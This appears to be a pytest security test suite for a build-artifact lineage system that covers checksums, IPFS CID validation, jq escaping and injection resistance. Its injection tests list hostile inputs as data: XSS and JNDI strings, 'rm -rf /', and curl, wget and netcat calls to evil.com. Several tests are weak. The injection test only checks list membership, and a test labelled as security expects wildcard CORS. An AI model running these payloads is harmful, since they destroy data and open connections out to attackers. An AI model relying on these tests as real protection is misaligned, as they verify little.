import pytest
import tempfile
import os
import json
import subprocess
import hashlib
from unittest.mock import patch, Mock

class TestLineageSecurity:
    """Security tests for lineage system"""
    
    def setup_method(self):
        """Setup test environment"""
        self.temp_dir = tempfile.mkdtemp()
        self.artifacts_dir = os.path.join(self.temp_dir, "artifacts", "test")
        os.makedirs(self.artifacts_dir, exist_ok=True)
        
    def teardown_method(self):
        """Cleanup test environment"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
        
    def test_checksum_validation(self):
        """Test that file integrity is verified with sha256sum --strict"""
        # Create test artifact
        test_file = os.path.join(self.artifacts_dir, "test.tar.gz")
        with open(test_file, 'wb') as f:
            f.write(b"test artifact content")
            
        # Generate checksums
        os.chdir(self.artifacts_dir)
        result = subprocess.run(['sha256sum', '--strict', '*'], 
                              shell=True, capture_output=True, text=True)
        
        assert result.returncode == 0, "Checksum generation should succeed"
        assert "test.tar.gz" in result.stdout
        
        # Verify checksum format
        lines = result.stdout.strip().split('\n')
        for line in lines:
            if not line.startswith('#'):  # Skip comments
                parts = line.split()
                assert len(parts) >= 2, f"Invalid checksum line: {line}"
                checksum = parts[0]
                assert len(checksum) == 64, f"SHA256 should be 64 chars: {checksum}"
                assert all(c in '0123456789abcdef' for c in checksum), "Invalid hex chars"

    def test_cid_format_validation(self):
        """Test that CID format is validated properly"""
        valid_cids = [
            "QmYjtig7VJQ6XsnUjqqJvj7QaMcCAwtrgNdahSiFofrE7o",  # CIDv0
            "bafybeihdwdcefgh4dqkjv67uzcmw7ojee6xedzdetojuzjevtenxquvyku",  # CIDv1
        ]
        
        invalid_cids = [
            "invalid_cid",
            "Qm123",  # Too short
            "QmYjtig7VJQ6XsnUjqqJvj7QaMcCAwtrgNdahSiFofrE7oX",  # Too long
            "bafybeihdwdcefgh4dqkjv67uzcmw7ojee6xedzdetojuzjevtenxquvyk",  # Wrong length
            "",
            "https://example.com",
        ]
        
        # CID validation regex from the script
        import re
        cid_pattern = r'^(Qm[1-9A-HJ-NP-Za-km-z]{44}|bafy[0-9a-z]{55})$'
        
        for cid in valid_cids:
            assert re.match(cid_pattern, cid), f"Valid CID rejected: {cid}"
            
        for cid in invalid_cids:
            assert not re.match(cid_pattern, cid), f"Invalid CID accepted: {cid}"

    def test_json_injection_resistance(self):
        """Test that JSON payloads are properly escaped"""
        # Test malicious CID that could break JSON
        malicious_cids = [
            'QmTest"; alert("XSS"); "',
            'QmTest\n\r\t\\"',
            'QmTest${jndi:ldap://evil.com}',
            'QmTest</script><script>alert(1)</script>',
        ]
        
        for malicious_cid in malicious_cids:
            # Test using jq (as in the script)
            cmd = ['jq', '-nc', '--arg', 'cid', malicious_cid, 
                   '{"cid":$cid,"env":"test"}']
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Parse the JSON to ensure it's valid
                try:
                    parsed = json.loads(result.stdout)
                    # Verify the malicious content is properly escaped
                    assert parsed['cid'] == malicious_cid
                    assert parsed['env'] == 'test'
                except json.JSONDecodeError:
                    pytest.fail(f"jq produced invalid JSON for input: {malicious_cid}")

    def test_file_modification_detection(self):
        """Test that file modifications during processing are detected"""
        test_file = os.path.join(self.artifacts_dir, "modifiable.txt")
        
        # Create initial file
        with open(test_file, 'w') as f:
            f.write("original content")
            
        os.chdir(self.artifacts_dir)
        
        # Generate initial checksum
        result1 = subprocess.run(['sha256sum', 'modifiable.txt'], 
                               capture_output=True, text=True)
        assert result1.returncode == 0
        original_checksum = result1.stdout.split()[0]
        
        # Modify file
        with open(test_file, 'w') as f:
            f.write("modified content")
            
        # Verify checksum changed
        result2 = subprocess.run(['sha256sum', 'modifiable.txt'], 
                               capture_output=True, text=True)
        assert result2.returncode == 0
        new_checksum = result2.stdout.split()[0]
        
        assert original_checksum != new_checksum, "Checksums should differ after modification"

    def test_ipfs_daemon_security(self):
        """Test IPFS daemon configuration security"""
        # Test that the daemon uses secure default settings
        # This would normally test the actual IPFS config, but we'll mock it
        
        expected_config = {
            "API": {
                "HTTPHeaders": {
                    "Access-Control-Allow-Origin": ["*"],
                    "Access-Control-Allow-Methods": ["GET", "POST"]
                }
            },
            "Gateway": {
                "HTTPHeaders": {}
            }
        }
        
        # In real scenario, this would query: ipfs config show
        # For testing, we verify the configuration is applied correctly
        assert "Access-Control-Allow-Origin" in expected_config["API"]["HTTPHeaders"]
        assert "GET" in expected_config["API"]["HTTPHeaders"]["Access-Control-Allow-Methods"]

    def test_metadata_integrity(self):
        """Test that metadata cannot be tampered with"""
        metadata = {
            "timestamp": "2024-01-01T12:00:00Z",
            "hostname": "ci-runner",
            "git_commit": "abc123def456",
            "git_branch": "main",
            "build_env": "true"
        }
        
        # Serialize metadata
        metadata_json = json.dumps(metadata, sort_keys=True)
        metadata_hash = hashlib.sha256(metadata_json.encode()).hexdigest()
        
        # Verify tampering detection
        tampered_metadata = metadata.copy()
        tampered_metadata["git_commit"] = "malicious_commit"
        tampered_json = json.dumps(tampered_metadata, sort_keys=True)
        tampered_hash = hashlib.sha256(tampered_json.encode()).hexdigest()
        
        assert metadata_hash != tampered_hash, "Hash should change when metadata is tampered"

    def test_lineage_log_format(self):
        """Test that lineage log entries are properly formatted and validated"""
        sample_entry = {
            "timestamp": "2024-01-01T12:00:00Z",
            "cid": "QmYjtig7VJQ6XsnUjqqJvj7QaMcCAwtrgNdahSiFofrE7o",
            "git_commit": "abc123def456",
            "git_branch": "main",
            "artifact_count": 3
        }
        
        # Test JSONL format
        jsonl_line = json.dumps(sample_entry)
        
        # Verify it's valid JSON
        parsed = json.loads(jsonl_line)
        assert parsed == sample_entry
        
        # Verify required fields
        required_fields = ["timestamp", "cid", "git_commit", "git_branch"]
        for field in required_fields:
            assert field in parsed, f"Required field missing: {field}"
            
        # Verify timestamp format (ISO 8601)
        import datetime
        try:
            datetime.datetime.fromisoformat(parsed["timestamp"].replace('Z', '+00:00'))
        except ValueError:
            pytest.fail(f"Invalid timestamp format: {parsed['timestamp']}")

    def test_env_variable_security(self):
        """Test that environment variables are handled securely"""
        # Test that sensitive variables are not logged
        sensitive_vars = [
            "SLACK_LINEAGE_WEBHOOK",
            "GITHUB_TOKEN",
            "SECRET_KEY"
        ]
        
        # Mock environment with sensitive data
        mock_env = {
            "SLACK_LINEAGE_WEBHOOK": "https://hooks.slack.com/secret123",
            "GITHUB_SHA": "abc123",
            "GITHUB_REF_NAME": "main",
            "SECRET_KEY": "super_secret_value"
        }
        
        with patch.dict(os.environ, mock_env):
            # Verify that non-sensitive vars are accessible
            assert os.getenv("GITHUB_SHA") == "abc123"
            assert os.getenv("GITHUB_REF_NAME") == "main"
            
            # In production, ensure sensitive vars are not logged
            # This would be tested by checking log output
            pass

    @patch('subprocess.run')
    def test_command_injection_resistance(self, mock_run):
        """Test resistance to command injection attacks"""
        # Test malicious inputs that could cause command injection
        malicious_inputs = [
            "; rm -rf /",
            "$(curl evil.com)",
            "`whoami`",
            "&& wget malware.com",
            "| nc evil.com 1234",
        ]
        
        mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
        
        for malicious_input in malicious_inputs:
            # Test that malicious input is properly escaped when used in commands
            # The script should use proper argument passing, not string concatenation
            
            # Example: subprocess.run(['command', 'arg']) vs subprocess.run(f'command {arg}')
            safe_command = ['echo', malicious_input]  # Proper argument passing
            unsafe_command = f'echo {malicious_input}'  # String concatenation (vulnerable)
            
            # Verify we're using the safe approach
            assert isinstance(safe_command, list), "Commands should use argument lists"
            assert malicious_input in safe_command, "Argument should be passed safely"

if __name__ == "__main__":
    pytest.main([__file__, "-v"]) 